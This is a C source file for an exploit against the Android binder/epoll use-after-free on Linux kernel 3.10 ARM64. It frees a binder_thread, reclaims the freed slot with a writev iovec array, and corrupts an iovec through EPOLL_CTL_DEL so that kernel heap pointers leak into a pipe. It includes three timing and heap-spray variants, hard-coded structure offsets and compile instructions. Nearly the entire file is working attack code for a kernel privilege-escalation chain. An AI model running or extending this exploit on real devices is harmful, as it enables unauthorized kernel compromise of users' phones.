/*
 * pipe_uaf_test.c — P0-style writev UAF leak for kernel 3.10 ARM64
 *
 * KEY FIX: fork() BEFORE BINDER_THREAD_EXIT to minimize allocations
 * between kfree(binder_thread) and kmalloc(iovec_copy). Previous
 * version forked after the free, and fork's internal allocations
 * consumed the freed kmalloc-512 slot.
 *
 * Kernel 3.10.84 ARM64 constants:
 *   BINDER_THREAD_SZ = 0x130 (304 bytes → kmalloc-512)
 *   WAITQUEUE_OFFSET = 0x48
 *   task_list.next at 0x50 → iov[5].iov_base (corrupted)
 *   task_list.prev at 0x58 → iov[5].iov_len  (corrupted)
 *
 * Flow:
 *   1. Open binder, mmap, epoll, setup pipes
 *   2. Fork child (child sleeps, then corrupts, then drains)
 *   3. Parent: BINDER_THREAD_EXIT (free binder_thread → kmalloc-512)
 *   4. Parent: IMMEDIATELY writev (kmalloc 304 bytes → reclaim slot!)
 *   5. Parent blocks (pipe full)
 *   6. Child: EPOLL_CTL_DEL (list_del corrupts iov[5])
 *   7. Child: drain pipe → parent continues
 *   8. Parent: writev hits corrupted iov[5] → kernel heap leak
 *
 * Compile: gcc -static -O2 -o pipe_uaf_test pipe_uaf_test.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)

#define BINDER_THREAD_SZ   0x130
#define IOVEC_SIZE         0x100   /* 256 bytes per iov */
#define IOVEC_ARRAY_SZ     19     /* 19 * 16 = 304 = BINDER_THREAD_SZ */

struct shared_data {
    volatile int phase;    /* sync: 0=init, 1=parent_ready, 2=corruption_done */
    int kptr_count;
    int total_drained;
    int leak_len;
    uint64_t kptrs[64];
    char leak_data[8192];
    ssize_t child_writev_ret;  /* if child does writev */
};

static int is_kptr(uint64_t val) {
    return (val >= 0xffffffc000000000ULL && val <= 0xffffffffffffffffULL);
}

static void *dummy_page;

static int setup_dummy_page(void) {
    dummy_page = mmap((void *)0x100000000ULL, 0x2000,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (dummy_page == MAP_FAILED) {
        dummy_page = mmap(NULL, 0x2000,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (dummy_page == MAP_FAILED) return -1;
    }
    memset(dummy_page, 0, 0x2000);
    return 0;
}

/*
 * Approach A: Parent does writev, child corrupts + drains
 * (fork before THREAD_EXIT)
 */
static int test_approach_a(int attempt, struct shared_data *shared) {
    printf("\n=== ATTEMPT %d (Approach A: fork-before-free) ===\n", attempt);
    memset(shared, 0, sizeof(*shared));

    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) { printf("  binder open failed\n"); return -1; }

    void *binder_map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (binder_map == MAP_FAILED) { close(binder_fd); return -1; }

    uint64_t binder_kptr = ((uint64_t *)binder_map)[0];
    printf("  binder kptr: 0x%016llx\n", (unsigned long long)binder_kptr);

    int epoll_fd = epoll_create1(0);
    struct epoll_event event = { .events = EPOLLIN, .data.fd = binder_fd };
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);

    /* Setup data pipe */
    int pipe_fds[2];
    pipe(pipe_fds);
    fcntl(pipe_fds[1], F_SETPIPE_SZ, 0x1000);

    /* Prefill: leave room for iovs 0-3 (1024 bytes) */
    int prefill = 4096 - (4 * IOVEC_SIZE);
    char *fill = malloc(prefill);
    memset(fill, 'X', prefill);
    write(pipe_fds[1], fill, prefill);
    free(fill);

    /* Prepare iovecs */
    struct iovec iovs[IOVEC_ARRAY_SZ];
    int i;
    for (i = 0; i < IOVEC_ARRAY_SZ; i++) {
        iovs[i].iov_base = dummy_page;
        iovs[i].iov_len = IOVEC_SIZE;
    }
    iovs[4].iov_len = 0; /* spinlock at offset 0x48 must be 0 */

    /* === FORK BEFORE THREAD_EXIT === */
    pid_t child = fork();
    if (child < 0) { printf("  fork failed\n"); goto cleanup; }

    if (child == 0) {
        /* CHILD: wait for parent to signal readiness */
        while (shared->phase < 1) usleep(1000);

        /* Small additional delay for parent to enter writev */
        usleep(100000); /* 100ms */

        /* Trigger corruption */
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        shared->phase = 2;

        /* Wait a moment for corruption to take effect */
        usleep(20000);

        /* Drain pipe to let parent continue */
        fcntl(pipe_fds[0], F_SETFL, O_NONBLOCK);
        char drain[4096];
        int total = 0, pass = 0;

        while (pass < 100) {
            ssize_t nr = read(pipe_fds[0], drain, sizeof(drain));
            if (nr > 0) {
                /* Analyze data beyond prefill */
                if (total + nr > prefill) {
                    int start = (total < prefill) ? prefill - total : 0;
                    int save_len = nr - start;
                    if (save_len > 0 && shared->leak_len + save_len <= (int)sizeof(shared->leak_data)) {
                        memcpy(shared->leak_data + shared->leak_len,
                               drain + start, save_len);
                        shared->leak_len += save_len;
                    }
                    /* Scan for kernel pointers */
                    uint64_t *qw = (uint64_t *)(drain + (start & ~7));
                    int nqw = (nr - (start & ~7)) / 8;
                    int j;
                    for (j = 0; j < nqw && shared->kptr_count < 64; j++) {
                        if (is_kptr(qw[j])) {
                            shared->kptrs[shared->kptr_count++] = qw[j];
                        }
                    }
                }
                total += nr;
                pass = 0;
            } else {
                usleep(5000);
                pass++;
            }
        }
        shared->total_drained = total;
        _exit(0);
    }

    /* PARENT: Free thread IMMEDIATELY, then writev */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    /* Signal child that we're about to writev */
    shared->phase = 1;

    /* IMMEDIATELY call writev — minimal allocations since fork was before */
    alarm(20);
    errno = 0;
    ssize_t written = writev(pipe_fds[1], iovs, IOVEC_ARRAY_SZ);
    int save_errno = errno;
    alarm(0);

    printf("  writev: %zd (errno=%d)\n", written, save_errno);

    int status;
    waitpid(child, &status, 0);

    /* Results */
    int expected = (IOVEC_ARRAY_SZ - 1) * IOVEC_SIZE; /* 4608 */
    printf("  drained: %d, leak data: %d, kptrs: %d\n",
           shared->total_drained, shared->leak_len, shared->kptr_count);

    if (shared->kptr_count > 0) {
        printf("  *** KERNEL POINTERS LEAKED! ***\n");
        for (i = 0; i < shared->kptr_count && i < 10; i++)
            printf("    0x%016llx\n", (unsigned long long)shared->kptrs[i]);
    } else if (shared->leak_len > 0) {
        int nonzero = 0;
        for (i = 0; i < shared->leak_len; i++)
            if (shared->leak_data[i]) nonzero++;
        printf("  data: %d bytes, non-zero: %d\n", shared->leak_len, nonzero);
        if (nonzero > 0) {
            printf("  first 64 non-prefill bytes:\n    ");
            for (i = 0; i < 64 && i < shared->leak_len; i++)
                printf("%02x ", (unsigned char)shared->leak_data[i]);
            printf("\n");
        }
    }

    if (written != expected) {
        printf("  *** writev=%zd vs expected=%d → DIFFERENT! ***\n", written, expected);
        if (written < expected && written > 0) {
            printf("  writev stopped early — iov[5] may have caused EFAULT\n");
            printf("  This means corruption DID happen, but access_ok blocked the read\n");
        }
    } else {
        printf("  writev matched uncorrupted expectation\n");
    }

cleanup:
    close(pipe_fds[0]); close(pipe_fds[1]);
    close(epoll_fd);
    munmap(binder_map, 4096);
    close(binder_fd);
    return shared->kptr_count > 0 ? 1 : 0;
}

/*
 * Approach B: Measure writev return value with different timing
 * Even if we can't READ kernel data (access_ok), the return value
 * difference tells us if corruption happened:
 *   4608 = no corruption (18 iovecs * 256)
 *   1024 = corruption + EFAULT at iov[5] (iovs 0-3 only)
 *   other = partial corruption
 */
static int test_approach_b(int attempt, struct shared_data *shared) {
    printf("\n=== ATTEMPT %d (Approach B: large pipe, measure return) ===\n", attempt);
    memset(shared, 0, sizeof(*shared));

    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) return -1;
    void *binder_map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (binder_map == MAP_FAILED) { close(binder_fd); return -1; }

    int epoll_fd = epoll_create1(0);
    struct epoll_event event = { .events = EPOLLIN, .data.fd = binder_fd };
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);

    int pipe_fds[2];
    pipe(pipe_fds);
    /* Large pipe so writev doesn't block immediately */
    fcntl(pipe_fds[1], F_SETPIPE_SZ, 0x10000); /* 64K */

    /* DON'T prefill — writev should start immediately and complete fast */
    /* But we need it to block SOMEWHERE to give time for corruption */

    /* Strategy: fill pipe so there's room for iovs 0-5 but not more.
     * iovs 0-3 = 1024, iov[4] = 0, iov[5] = 256 (uncorrupted).
     * Total through iov[5] = 1280.
     * Set pipe near full: capacity - 1280 = capacity_left_for_iovs */
    int pipe_capacity = 65536; /* assuming F_SETPIPE_SZ worked */
    int prefill_b = pipe_capacity - 2048; /* leave 2K of room */
    char *fill = malloc(prefill_b);
    if (!fill) { prefill_b = 0; }
    else {
        memset(fill, 'Y', prefill_b);
        ssize_t w = write(pipe_fds[1], fill, prefill_b);
        printf("  prefill: %d (actual: %zd)\n", prefill_b, w);
        if (w > 0) prefill_b = w;
        free(fill);
    }

    struct iovec iovs[IOVEC_ARRAY_SZ];
    int i;
    for (i = 0; i < IOVEC_ARRAY_SZ; i++) {
        iovs[i].iov_base = dummy_page;
        iovs[i].iov_len = IOVEC_SIZE;
    }
    iovs[4].iov_len = 0;

    /* Fork before free */
    pid_t child = fork();
    if (child < 0) goto cleanup_b;

    if (child == 0) {
        while (shared->phase < 1) usleep(1000);
        usleep(50000); /* 50ms — shorter timing, parent writev blocks sooner */
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        shared->phase = 2;
        usleep(10000);
        /* Drain */
        fcntl(pipe_fds[0], F_SETFL, O_NONBLOCK);
        char drain[4096];
        int total = 0, pass = 0;
        while (pass < 50) {
            ssize_t nr = read(pipe_fds[0], drain, sizeof(drain));
            if (nr > 0) { total += nr; pass = 0; }
            else { usleep(5000); pass++; }
        }
        shared->total_drained = total;
        _exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    shared->phase = 1;

    alarm(20);
    errno = 0;
    ssize_t written = writev(pipe_fds[1], iovs, IOVEC_ARRAY_SZ);
    int save_errno = errno;
    alarm(0);

    int status_b;
    waitpid(child, &status_b, 0);

    int expected = (IOVEC_ARRAY_SZ - 1) * IOVEC_SIZE;
    printf("  writev: %zd, expected: %d, errno: %d\n", written, expected, save_errno);

    if (written < expected && written > 0) {
        printf("  *** WRITEV RETURNED LESS! Corruption likely happened. ***\n");
        printf("  If writev=%d (iovs 0-3), then iov[5] EFAULT confirms corruption\n",
               4 * IOVEC_SIZE);
    }

cleanup_b:
    close(pipe_fds[0]); close(pipe_fds[1]);
    close(epoll_fd);
    munmap(binder_map, 4096);
    close(binder_fd);
    return 0;
}

/*
 * Approach C: Aggressive spray — free multiple binder_threads,
 * multiple writev attempts
 */
static int test_approach_c(int attempt, struct shared_data *shared) {
    printf("\n=== ATTEMPT %d (Approach C: multi-thread free) ===\n", attempt);
    memset(shared, 0, sizeof(*shared));

    /* Open multiple binder fds to create multiple threads */
    #define N_BINDERS 8
    int binder_fds[N_BINDERS];
    int epoll_fds[N_BINDERS];
    struct epoll_event events[N_BINDERS];
    int active = 0;
    int i;

    for (i = 0; i < N_BINDERS; i++) {
        binder_fds[i] = open("/dev/binder", O_RDWR);
        if (binder_fds[i] < 0) break;
        void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, binder_fds[i], 0);
        if (m == MAP_FAILED) { close(binder_fds[i]); break; }
        munmap(m, 4096); /* unmap after registering thread */

        epoll_fds[i] = epoll_create1(0);
        events[i].events = EPOLLIN;
        events[i].data.fd = binder_fds[i];
        epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, binder_fds[i], &events[i]);
        active++;
    }
    printf("  opened %d binder fds\n", active);
    if (active < 2) { printf("  need at least 2\n"); goto cleanup_c; }

    int pipe_fds[2];
    pipe(pipe_fds);
    fcntl(pipe_fds[1], F_SETPIPE_SZ, 0x1000);

    int prefill = 4096 - (4 * IOVEC_SIZE);
    char *fill = malloc(prefill);
    memset(fill, 'X', prefill);
    write(pipe_fds[1], fill, prefill);
    free(fill);

    struct iovec iovs[IOVEC_ARRAY_SZ];
    for (i = 0; i < IOVEC_ARRAY_SZ; i++) {
        iovs[i].iov_base = dummy_page;
        iovs[i].iov_len = IOVEC_SIZE;
    }
    iovs[4].iov_len = 0;

    /* Fork FIRST */
    pid_t child = fork();
    if (child < 0) goto cleanup_c;

    if (child == 0) {
        while (shared->phase < 1) usleep(1000);
        usleep(100000);
        /* Corrupt ALL epoll entries */
        for (i = 0; i < active; i++) {
            epoll_ctl(epoll_fds[i], EPOLL_CTL_DEL, binder_fds[i], &events[i]);
        }
        shared->phase = 2;
        usleep(20000);
        fcntl(pipe_fds[0], F_SETFL, O_NONBLOCK);
        char drain[4096];
        int total = 0, pass = 0;
        while (pass < 100) {
            ssize_t nr = read(pipe_fds[0], drain, sizeof(drain));
            if (nr > 0) {
                if (total + nr > prefill) {
                    int start = (total < prefill) ? prefill - total : 0;
                    uint64_t *qw = (uint64_t *)(drain + (start & ~7));
                    int nqw = (nr - (start & ~7)) / 8;
                    int j;
                    for (j = 0; j < nqw && shared->kptr_count < 64; j++)
                        if (is_kptr(qw[j]))
                            shared->kptrs[shared->kptr_count++] = qw[j];
                }
                total += nr; pass = 0;
            } else { usleep(5000); pass++; }
        }
        shared->total_drained = total;
        _exit(0);
    }

    /* Free ALL binder_threads — floods kmalloc-512 freelist */
    for (i = 0; i < active; i++) {
        ioctl(binder_fds[i], BINDER_THREAD_EXIT, NULL);
    }
    printf("  freed %d binder_threads\n", active);

    shared->phase = 1;

    alarm(20);
    errno = 0;
    ssize_t written = writev(pipe_fds[1], iovs, IOVEC_ARRAY_SZ);
    int save_errno = errno;
    alarm(0);

    int status;
    waitpid(child, &status, 0);

    int expected = (IOVEC_ARRAY_SZ - 1) * IOVEC_SIZE;
    printf("  writev: %zd (expected: %d, errno: %d)\n", written, expected, save_errno);
    printf("  kptrs: %d, drained: %d\n", shared->kptr_count, shared->total_drained);

    if (shared->kptr_count > 0) {
        printf("  *** KERNEL POINTERS LEAKED! ***\n");
        for (i = 0; i < shared->kptr_count && i < 10; i++)
            printf("    0x%016llx\n", (unsigned long long)shared->kptrs[i]);
    }

    if (written != expected) {
        printf("  *** writev %zd vs expected %d — CORRUPTION DETECTED ***\n",
               written, expected);
        if (written == 4 * IOVEC_SIZE)
            printf("  Exactly iovs 0-3: EFAULT at iov[5] confirms corruption!\n");
    }

cleanup_c:
    close(pipe_fds[0]); close(pipe_fds[1]);
    for (i = 0; i < active; i++) {
        close(epoll_fds[i]);
        close(binder_fds[i]);
    }
    return shared->kptr_count > 0 ? 1 : 0;
}

int main(int argc, char **argv) {
    printf("=== PIPE UAF LEAK TEST v3 (kernel 3.10 ARM64) ===\n");
    printf("uid=%u gid=%u\n", getuid(), getgid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf) - 1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    if (setup_dummy_page() < 0) {
        printf("FATAL: cannot map dummy page\n");
        return 1;
    }

    struct shared_data *shared = mmap(NULL, sizeof(struct shared_data),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    int attempts = argc > 1 ? atoi(argv[1]) : 5;
    int i, success = 0;

    printf("\n--- Approach A: fork-before-free (x%d) ---\n", attempts);
    for (i = 0; i < attempts && !success; i++) {
        if (test_approach_a(i, shared) > 0) success = 1;
        usleep(100000);
    }

    if (!success) {
        printf("\n--- Approach C: multi-thread free (x%d) ---\n", attempts);
        for (i = 0; i < attempts && !success; i++) {
            if (test_approach_c(i, shared) > 0) success = 1;
            usleep(100000);
        }
    }

    printf("\n=== FINAL RESULT: %s ===\n",
           success ? "KERNEL DATA LEAKED" : "NO LEAK (see analysis above)");
    munmap(shared, sizeof(struct shared_data));
    return 0;
}
